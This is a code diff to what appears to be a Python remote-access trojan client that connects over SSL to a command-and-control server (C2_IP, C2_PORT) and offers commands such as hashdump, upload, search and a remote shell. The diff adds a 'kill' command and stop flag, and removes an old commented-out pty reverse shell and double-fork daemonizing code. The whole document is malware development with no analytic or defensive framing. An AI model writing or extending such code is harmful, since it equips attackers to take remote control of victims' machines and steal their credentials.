@@ -1,4 +1,4 @@
-import socket, ssl, threading, sys, os, subprocess
+import socket, ssl, threading, sys, os, subprocess, _thread
 import secrets, platform, uuid, datetime
 import shutil, hashlib, mss, mss.tools
 import platform
@@ -32,9 +32,11 @@ class Client:
             'upload': self.upload,
             'hashdump': self.hashdump,
             'search': self.search,
-            'ipconfig': self.ipconfig
+            'ipconfig': self.ipconfig,
+            'kill': self.kill
         }
         self.agent_path = None
+        self.is_killed = False
     
     def connect(self):
         context = ssl.create_default_context()
@@ -81,63 +83,13 @@ class Client:
             except Exception as e:
                 break
 
+    def kill(self, args):
+        self.secure_sock.close()
+        self.is_killed = True
+
     def screenshot(self, args):
         raise NotImplementedError("This method should be implemented by subclasses")
-    """
-    def daemonize(self, args):
-        def fork():
-            try:
-                pid = os.fork()
-                if pid > 0:
-                    # Exit parent
-                    sys.exit(0)
-            except OSError as e:
-                print("Error while forking: ", e)
-                sys.exit(1)
 
-        # Double fork to daemonize
-        fork()
-        os.setsid()
-        os.umask(0)
-        fork()
-
-    def reverse_shell(self, args):
-        s = self.secure_sock
-        master, slave = pty.openpty()
-        bash = subprocess.Popen(SHELL,
-                                preexec_fn=os.setsid,
-                                stdin=slave,
-                                stdout=slave,
-                                stderr=slave,
-                                universal_newlines=True)
-        sleep(1)  # Wait for bash to start before sending data to it.
-        os.write(master, bytes("{}\n".format(FIRST_COMMAND), encoding="utf-8"))
-
-        try:
-            while bash.poll() is None:
-                r, w, e = select.select([s, master], [], [])
-
-                # SSLSockets don't play nice with select because they buffer data internally.
-                # Code taken from https://stackoverflow.com/questions/3187565/select-and-ssl-in-python.
-                if s in r:
-                    try:
-                        data = s.recv(1024)
-                    except ssl.SSLError as e:
-                        if e.errno == ssl.SSL_ERROR_WANT_READ:
-                            continue
-                        raise
-                    if not data:  # End of file.
-                        break
-                    data_left = s.pending()
-                    while data_left:
-                        data += s.recv(data_left)
-                        data_left = s.pending()
-                    os.write(master, data)
-                elif master in r:
-                    s.write(os.read(master, 2048))
-        finally:
-            s.close()
-    """
     def reverse_shell(self, args):
         while True:
             command = self.secure_sock.recv(4096).decode()
@@ -381,7 +333,7 @@ if __name__ == "__main__":
     else:
         client = LinuxClient(C2_IP, C2_PORT)
         #client.persistence()
-    while True:
+    while not client.is_killed:
         try:
             client.connect()
         except:
